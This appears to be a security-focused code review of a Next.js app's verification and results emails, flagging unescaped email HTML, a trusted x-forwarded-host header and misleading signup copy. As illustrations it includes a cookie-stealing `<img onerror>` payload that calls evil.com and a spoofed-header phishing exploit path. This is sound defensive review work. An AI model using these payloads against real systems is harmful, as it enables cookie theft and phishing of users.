# Credentials auth, deterministic engines, and group management (v2 — post-fix)

All five issues from the v1 review have been resolved. This pass focuses on verifying each fix and surfacing any new concerns introduced in the process.

**Watch for:**
- `interpretation` from method engines is interpolated directly into the results-email HTML without escaping — a student name or engine string containing `<script>` or `<img onerror=…>` injects HTML into the recipient's email client (confirmed pattern).
- Results-email origin falls back to the raw `x-forwarded-host` request header when `NEXT_PUBLIC_APP_URL` is unset — on deployments not behind a trusted reverse proxy this lets a caller inject an arbitrary host into the link sent to the student (possible; depends on deployment topology).
- The login page's unverified-account prompt links to `/register` with the copy "Regístrate nuevamente", implying account creation rather than token re-issue (confirmed in the UI).

**Verdict**: NEEDS_CHANGES

---

## High-level view

The five v1 fixes land correctly. `createUser` has a clean five-placeholder INSERT. `setUserRole` calls `getCurrentUser()` and compares emails before applying the update, with both exact-match and case-mismatch covered by test. `consumeVerificationToken` is a single atomic `UPDATE … RETURNING` with no SELECT+UPDATE window. `sendVerificationEmail` logs a Spanish warning when `NEXT_PUBLIC_APP_URL` is unset. `registerAction` re-issues a token for unverified accounts after `ON CONFLICT DO NOTHING` returns zero rows; all three branches are tested.

The results-email origin resolves `NEXT_PUBLIC_APP_URL → x-forwarded-host → Host → localhost`. `NEXT_PUBLIC_APP_URL` is now marked required in `.env.example`, but the `x-forwarded-host` fallback trusts a client-controlled header — on a deployment without that variable and without a proxy that strips it, a caller can redirect the student's results email to an arbitrary domain.

All user-visible fields interpolated into email HTML (`interpretation`, `studentName`, `methodName`, `dominantCode`, `displayName`) go in without escaping. The current engines produce plain-prose interpretations, but `studentName` arrives directly from the POST body and has no server-side sanitization before it reaches the template.

The login page unverified-account branch works — `/register` re-issues a token — but the copy ("Regístrate nuevamente") and the register form heading ("Crear cuenta") both signal a new-account flow. A user who already registered will reasonably assume their account is being deleted and recreated.

<summary>Issues (3)</summary>

1. **Email HTML injection via user-controlled fields** — `buildResultsEmail` and `buildVerificationEmail` interpolate `studentName`, `displayName`, `interpretation`, `methodName`, and `dominantCode` directly into HTML with no escaping. `studentName` arrives from the POST body with no server-side sanitization. Add a minimal `escapeHtml` helper (`&amp; &lt; &gt; &quot; &#x27;`) applied to all user-visible fields before interpolation in `messages.ts`.

2. **`x-forwarded-host` trusted without allowlist in results-email URL** — When `NEXT_PUBLIC_APP_URL` is unset, `POST /api/sessions` builds the results-email link from `x-forwarded-host`, freely settable by any HTTP client. A crafted request causes the student's email to link to an attacker-controlled domain. Drop the `x-forwarded-host` leg and fall back to `Host` only, or document `NEXT_PUBLIC_APP_URL` as strictly required for results-email delivery.

3. **Unverified-account UX copy misleads users** — The login page's unverified-account prompt says "Regístrate nuevamente" and links to `/register`, which implies creating a new account. The actual behavior (re-issuing a token for the existing account) is invisible to the user. Change the copy to "Solicitar nuevo correo de verificación" and add a query-param hint to the register page so it can confirm the resend rather than showing a create-account form.

## Email HTML injection

```typescript
// messages.ts — no escaping on any interpolated field
const html = `…<p style="line-height:1.6;">${interpretation}</p>…
              <strong>${methodName}</strong>…
              <p>${greeting},</p>`;
```

`studentName` is passed directly from `body.studentName ?? undefined` in the POST handler without sanitization. A name like `<img src=x onerror="fetch('https://evil.com/?'+document.cookie)">` renders as executable HTML in most email clients. `interpretation` is engine-generated prose today, but the same gap applies if an engine ever incorporates student-supplied text (e.g., a free-text field in a future method).

```typescript
function escapeHtml(s: string): string {
  return s.replace(/&/g, "&amp;").replace(/</g, "&lt;")
          .replace(/>/g, "&gt;").replace(/"/g, "&quot;")
          .replace(/'/g, "&#x27;");
}
```

Applied to all five fields at the point of interpolation in `messages.ts`. The `resultsUrl` and `verifyUrl` fields are already URL-encoded via `encodeURIComponent` and constructed server-side, so they are lower risk.

## `x-forwarded-host` origin injection

```typescript
const origin =
  appUrl ||
  (forwardedHost ? `https://${forwardedHost}` : null) ||
  (host ? `https://${host}` : "http://localhost:3000");
```

`x-forwarded-host` is freely settable by any HTTP client. On a Vercel deployment where `NEXT_PUBLIC_APP_URL` is not set, a POST to `/api/sessions` with `x-forwarded-host: phishing.example.com` causes the student's results email to link to `https://phishing.example.com/results/{id}`. The session UUID is not secret (it's returned in the 201 response), so the full exploit is: submit a session with a crafted header → receive the UUID in the response → the student's email contains a phishing link.

`Host` (without the `x-forwarded-` prefix) is controlled by the server on Vercel/Neon and is not freely spoofable the same way. The minimal fix: remove the `forwardedHost` leg entirely. The safer fix: set `NEXT_PUBLIC_APP_URL` in production and treat its absence as a misconfiguration logged at warn-level, the same as `sendVerificationEmail` already does.
